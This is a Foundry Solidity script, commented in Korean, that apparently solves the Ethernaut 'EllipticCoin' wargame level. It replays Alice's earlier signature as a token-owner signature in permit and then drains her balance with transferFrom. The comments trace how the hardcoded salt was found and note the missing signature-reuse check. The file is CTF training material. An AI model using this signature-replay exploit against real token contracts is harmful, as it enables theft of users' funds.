// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {EllipticToken} from "src/35.EllipticCoin.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract EllipticCoinScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address playerAddr = msg.sender;
        address instanceAddr = 0x1Eb7beBf084Df8d3961C9647A4fF1E697d4E91D5;
        address aliceAddr = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;

        EllipticToken ellipticToken = EllipticToken(instanceAddr);

        uint256 aliceBalance = ellipticToken.balanceOf(aliceAddr);
        console.log("Alice Balance:", aliceBalance);

        // amount를 alice가 사용한 voucherHash로 사용해야 함
        // 그래야 permit에서 이전에 사용한 voucherHash랑 충돌이 나지 않으면서 receiverSignature를
        // tokenOwnerSignature로 재활용할 수 있음
        // 서명 재사용을 방지하는 로직은 존재하지 않음
        // voucherHash는 alice의 현재 토큰 잔액보다 클 수 밖에 없음
        // 왜냐하면 해시는 leading zero가 늘어날수록 찾기 어려워짐
        // alice는 10000000000000000000개의 토큰을 가지고 있음
        // 이 값은 bytes32로 변환하면
        // 0x0000000000000000000000000000000000000000000000008ac7230489e80000
        // 이 값을 해싱해서 찾기는 하늘의 별따기..

        // 문제는 이 값들을 어떻게 찾아올 수 있을지...
        // 스토리지 슬롯은 0xd247cbe442ae22f27eca74f2f68af8e8369ac80feba1807462fad338008f9e7e
        // 라는 것을 알 수 있으나 문제는 voucherHash가 슬롯 번호 계산에 필요한 값이라는 것...
        // 인스턴스를 생성할 때 파라미터로는 레벨만 들어가있으므로
        // 이 값들은 코드 상에 하드코딩되어 있다는 것을 알 수 있음
        // 그렇다면 하드코딩된 값을 가져오는 수 밖에...
        // https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/levels/EllipticTokenFactory.sol
        // 역시나

        bytes32 salt = keccak256("BOB and ALICE are part of the secret sauce");
        bytes32 voucherHash = keccak256(abi.encodePacked(aliceBalance, aliceAddr, salt));

        uint256 amount = uint256(voucherHash);
        bytes memory tokenOwnerSignature =
            hex"ab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c";

        bytes32 permitHash = keccak256(abi.encodePacked(aliceAddr, playerAddr, amount));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerAddr, permitHash); // sign the permit hash with spender

        bytes memory spenderSignature = abi.encodePacked(r, s, v);

        address spender = ECDSA.recover(permitHash, spenderSignature);
        console.log("Spender:", spender);

        ellipticToken.permit(amount, spender, tokenOwnerSignature, spenderSignature);
        ellipticToken.transferFrom(aliceAddr, playerAddr, aliceBalance);

        uint256 playerBalance = ellipticToken.balanceOf(playerAddr);

        console.log("Player Balance after transfer:", playerBalance);

        // ERC-2612 Permit 표준을 사용합시다.

        vm.stopBroadcast();
    }
}
